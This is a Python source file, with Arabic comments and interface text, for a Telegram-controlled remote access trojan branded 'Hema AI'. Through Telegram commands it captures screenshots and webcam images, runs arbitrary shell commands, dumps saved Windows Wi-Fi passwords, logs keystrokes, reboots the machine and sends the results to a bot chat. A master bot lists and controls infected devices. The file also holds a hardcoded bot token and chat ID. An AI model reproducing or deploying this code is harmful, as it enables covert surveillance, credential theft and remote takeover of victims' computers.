import platform
import os
import threading
import telebot
from colorama import init, Fore, Style
import tkinter as tk
from tkinter import messagebox
import pyautogui
import cv2
from pynput.keyboard import Listener
import subprocess
import webbrowser
import psutil
import socket
import time

init()

# البوت الأساسي
MASTER_TOKEN = "7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
MASTER_CHAT_ID = "5967116314"
master_bot = telebot.TeleBot(MASTER_TOKEN)

# البوت الثانوي
SECONDARY_TOKEN = "YOUR_BOT_TOKEN"  # استبدلها بتوكين البوت الخاص بك
SECONDARY_CHAT_ID = "YOUR_CHAT_ID"  # استبدلها بـ Chat ID الخاص بك
secondary_bot = telebot.TeleBot(SECONDARY_TOKEN)

DEFAULT_PASSWORD = "01202060839"
LOGO = [
    "██╗  ██╗███████╗███╗   ███╗ █████╗     █████╗ ██╗",
    "██║  ██║██╔════╝████╗ ████║██╔══██╗   ██╔══██╗██║",
    "███████║█████╗  ██╔████╔██║███████║   ███████║██║",
    "██╔══██║██╔══╝  ██║╚██╔╝██║██╔══██║   ██╔══██║██║",
    "██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██╗██║  ██║██║",
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═╝"
]

OS = platform.system()
DEVICE_NAME = platform.node()
running_tasks = {}
connected_devices = {}

def display_logo():
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for i, line in enumerate(LOGO):
        print(colors[i % len(colors)] + line + Style.RESET_ALL)

def login_window():
    def check_password():
        if entry.get() == DEFAULT_PASSWORD:
            root.destroy()
            start_bots()
        else:
            messagebox.showerror("خطأ", "كلمة المرور غير صحيحة!")
    root = tk.Tk()
    root.title("Hema AI - تسجيل الدخول")
    root.geometry("400x500")
    root.configure(bg="#1e1e2f")
    logo_label = tk.Label(root, text="\n".join(LOGO), font=("Courier", 10), fg="#00ffcc", bg="#1e1e2f")
    logo_label.pack(pady=20)
    tk.Label(root, text="أدخل كلمة المرور:", font=("Arial", 12), fg="#ffffff", bg="#1e1e2f").pack(pady=10)
    entry = tk.Entry(root, show="*", font=("Arial", 12), bg="#2d2d44", fg="#00ffcc")
    entry.pack(pady=10)
    tk.Button(root, text="تسجيل الدخول", command=check_password, font=("Arial", 12), bg="#ff5555", fg="#ffffff").pack(pady=20)
    root.mainloop()

def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")
    with open("screen.png", "rb") as photo:
        secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)

def start_camera():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("camera.jpg", frame)
        with open("camera.jpg", "rb") as photo:
            secondary_bot.send_photo(SECONDARY_CHAT_ID, photo)
    cap.release()

def restart_device():
    if OS == "Windows":
        os.system("shutdown /r /t 0")
    else:
        os.system("reboot")

def execute_cmd(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    secondary_bot.send_message(SECONDARY_CHAT_ID, result.stdout or result.stderr or "تم التنفيذ")

def open_link(url):
    webbrowser.open(url)

def execute_shell(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    secondary_bot.send_message(SECONDARY_CHAT_ID, result.stdout or result.stderr or "تم التنفيذ")

def get_passwords():
    if OS == "Windows":
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
        profiles = [line.split(":")[1].strip() for line in data.split('\n') if "All User Profile" in line]
        for profile in profiles:
            details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8')
            secondary_bot.send_message(SECONDARY_CHAT_ID, details)
    else:
        secondary_bot.send_message(SECONDARY_CHAT_ID, "استخراج كلمات المرور لـ Windows فقط.")

def start_keylogger():
    def on_press(key):
        secondary_bot.send_message(SECONDARY_CHAT_ID, f"تم تسجيل: {key}")
    listener = Listener(on_press=on_press)
    listener.start()
    running_tasks["keylogger"] = listener

def stop_keylogger():
    if "keylogger" in running_tasks:
        running_tasks["keylogger"].stop()
        del running_tasks["keylogger"]
        secondary_bot.send_message(SECONDARY_CHAT_ID, "تم إيقاف تسجيل المفاتيح.")

def get_device_info():
    info = {
        "Device": DEVICE_NAME,
        "OS": OS,
        "CPU": psutil.cpu_percent(),
        "RAM": psutil.virtual_memory().percent
    }
    return info

@master_bot.message_handler(commands=['start'])
def master_welcome(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        master_bot.reply_to(message, "مرحبًا! البوت الأساسي جاهز.\nاستخدم /devices لعرض الأجهزة المتصلة.")

@master_bot.message_handler(commands=['devices'])
def list_devices(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        if connected_devices:
            response = "الأجهزة المتصلة:\n" + "\n".join([f"{i}: {name}" for i, name in enumerate(connected_devices.keys())])
            response += "\nاستخدم /control <رقم> للتحكم في جهاز."
            master_bot.reply_to(message, response)
        else:
            master_bot.reply_to(message, "لا توجد أجهزة متصلة.")

@master_bot.message_handler(commands=['control'])
def control_device(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        try:
            device_idx = int(message.text.split()[1])
            device_name = list(connected_devices.keys())[device_idx]
            master_bot.reply_to(message, f"تم اختيار {device_name}. أرسل الأوامر الآن.")
            connected_devices[device_name]["controlling"] = True
        except:
            master_bot.reply_to(message, "رقم غير صحيح. استخدم /devices لرؤية القائمة.")

@master_bot.message_handler(func=lambda message: True)
def forward_command(message):
    if str(message.chat.id) == MASTER_CHAT_ID:
        for device_name, info in connected_devices.items():
            if info.get("controlling"):
                secondary_bot.send_message(info["chat_id"], message.text)
                break

@secondary_bot.message_handler(commands=['start'])
def secondary_welcome(message):
    if str(message.chat.id) == SECONDARY_CHAT_ID:
        secondary_bot.reply_to(message, "مرحبًا! البوت الثانوي جاهز.")
        device_info = get_device_info()
        master_bot.send_message(MASTER_CHAT_ID, f"جهاز جديد متصل:\n{device_info}")
        connected_devices[DEVICE_NAME] = {"chat_id": SECONDARY_CHAT_ID, "controlling": False}

@secondary_bot.message_handler(func=lambda message: True)
def handle_commands(message):
    if str(message.chat.id) != SECONDARY_CHAT_ID:
        return
    cmd = message.text.split()[0]
    args = " ".join(message.text.split()[1:]) if len(message.text.split()) > 1 else ""
    
    commands = {
        "/screenshot": take_screenshot,
        "/start_camera": start_camera,
        "/restart": restart_device,
        "/cmd": lambda: execute_cmd(args),
        "/open_link": lambda: open_link(args),
        "/shell": lambda: execute_shell(args),
        "/get_passwords": get_passwords,
        "/start_keylogger": start_keylogger,
        "/stop_keylogger": stop_keylogger,
    }
    if cmd in commands:
        threading.Thread(target=commands[cmd], daemon=True).start()

def start_bots():
    print(Fore.GREEN + "Hema AI يعمل الآن..." + Style.RESET_ALL)
    threading.Thread(target=master_bot.polling, daemon=True).start()
    threading.Thread(target=secondary_bot.polling, daemon=True).start()

if __name__ == "__main__":
    display_logo()
    try:
        login_window()
    except:
        print(Fore.RED + "نافذة تسجيل الدخول غير متاحة، بدء البوت مباشرة..." + Style.RESET_ALL)
        start_bots()
